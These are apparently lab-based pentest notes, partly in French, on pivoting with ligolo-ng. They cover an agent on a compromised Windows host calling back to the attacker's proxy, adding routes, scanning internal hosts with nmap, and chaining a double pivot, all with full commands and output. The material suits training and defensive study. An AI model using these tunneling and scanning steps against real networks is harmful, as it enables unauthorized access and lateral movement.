![[pivoting.png]]
![[pt_fw.png]]
![[pf_visu.png]]


https://github.com/nicocha30/ligolo-ng

In `exegol` the tool is in `/opt/tools/ligolo-ng`

Sur la page github, nous pouvons choper l’onglet “releases” pour avoir les différentes versions

Il nous faudra 2 fichiers ; un proxy à faire tourner depuis notre machine attaquante, et un agent à installer sur la machine distante.

Une fois l’agent.exe envoyé sur la machine distance, nous devons créer une interface sur notre machine attaquante :

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

# Then, we can run our listener using : 
./proxy -selfcert
# Use a custom port if running in firewalled environment 
./proxy -selfcert -laddr 0.0.0.0:443

# On the distance machine, we can launch our agent.exe using our attacking IP: 
.\\agent.exe -connect 10.10.15.136:443 -ignore-cert
```

And then, we should be getting that message :

```bash
INFO[0000] Listening on 10.10.15.136:80
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \\/ / __ \\______/ __ \\/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\\__, /\\____/_/\\____/     /_/ /_/\\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!

ligolo-ng » INFO[0012] Agent joined.                                 name="NT AUTHORITY\\\\SYSTEM@WEB-WIN01" remote="10.129.36.105:50031"

# List active sessions
ligolo-ng » session
? Specify a session : 1 - #1 - NT AUTHORITY\\SYSTEM@WEB-WIN01 - 10.129.36.105:50031
[Agent : NT AUTHORITY\\SYSTEM@WEB-WIN01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:94:f3:16              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::62:9f68:e2ec:48d/64      │
│ IPv4 Address │ 172.16.6.100/16                │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────────┐
│ Interface 1                                      │
├──────────────┬───────────────────────────────────┤
│ Name         │ Ethernet0                         │
│ Hardware MAC │ 00:50:56:94:e1:f1                 │
│ MTU          │ 1500                              │
│ Flags        │ up|broadcast|multicast|running    │
│ IPv6 Address │ dead:beef::2935:bcce:8da4:7c0b/64 │
│ IPv6 Address │ fe80::2935:bcce:8da4:7c0b/64      │
│ IPv4 Address │ 10.129.36.105/16                  │
└──────────────┴───────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
[Agent : NT AUTHORITY\\SYSTEM@WEB-WIN01] »
```

Once the client has joined, we can list the available sessions (here is the number 1) and execute ifconfig to see the different interfaces of the compromised host.

- Now we want to add the new network `172.16.6.0/16` to the routing table of our Exegol :

```bash
# Add network to the routing table
sudo ip route add 172.16.0.0/16 dev ligolo

# Show routing table
ip route list

default via 172.26.112.1 dev eth0 proto kernel
10.10.10.0/23 via 10.10.14.1 dev tun0
10.10.14.0/23 dev tun0 proto kernel scope link src 10.10.15.136
10.10.14.0/23 dev tun1 proto kernel scope link src 10.10.14.117
10.129.0.0/16 via 10.10.14.1 dev tun0
172.16.0.0/16 dev ligolo scope link linkdown
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown
172.20.0.0/16 dev br-d8e56998eb31 proto kernel scope link src 172.20.0.1
172.21.0.0/16 dev br-8273b01604af proto kernel scope link src 172.21.0.1
172.26.112.0/20 dev eth0 proto kernel scope link src 172.26.124.58
```

- Once the new network has been added to the routing table, we can start the tunnel using the `start` command on the `ligolo-ng` server :

```bash
[Agent : NT AUTHORITY\\SYSTEM@WEB-WIN01] » start
[Agent : NT AUTHORITY\\SYSTEM@WEB-WIN01] » INFO[0807] Starting tunnel to NT AUTHORITY\\SYSTEM@WEB-WIN01
```

Now, we can just simply hit every command on our exegol container to the network or a specific host :

```bash
nmap -sTC -Pn -A -T4 --min-rate=10000 172.16.6.50

Starting Nmap 7.93 ( <https://nmap.org> ) at 2024-09-06 17:43 CEST
Nmap scan report for 172.16.6.50
Host is up (0.016s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-06T15:43:16+00:00
|_ssl-date: 2024-09-06T15:43:56+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2024-09-05T13:39:23
|_Not valid after:  2025-03-07T13:39:23
```

Be careful : for Nmap, we need to use TCP packets using `-sT` ! 


# Double Pivot : Don't use alpha releases !!! (use 0.7.2)

```
# Add another interface for 2nd pivot

sudo ip tuntap add user root mode tun ligolo-double
sudo ip link set ligolo-double up
```

- Back on the proxy : 
```bash
# Redirect all trafic from 1stMachine:443 to our localhost:443
[Agent : root@dmz01] » listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp

# !!! The loopback port always has to match the listening port indicated in the proxy !!!
# Cf https://github.com/nicocha30/ligolo-ng/issues/61 in case of "connection refused" error


# Check the listener is running
[Agent : root@dmz01] » listener_list
```

- On the 2nd machine containing the other network we want to connect to. Be sure to connect with machine 2 on the same network machine 1 and 2 are 
```
.\agent.exe -connect 1stMachineIp:443 -ignore-cert
```

- Going back to the proxy, we have to activate the new tunnel : 
```bash
# Choose session 2 of the new agent
[Agent : root@dmz01] » session

# Start the tunnel
[Agent : INLANEFREIGHT\Administrator@DC01] » start --tun ligolo-double

# Finally, add the other route to new network 
ip route add 172.16.9.0/24 dev ligolo-double
```

Attention sur les routes à ajouter : prioriser le `/24` dans l'ajout des routes :


Sources :
https://4pfsec.com/ligolo
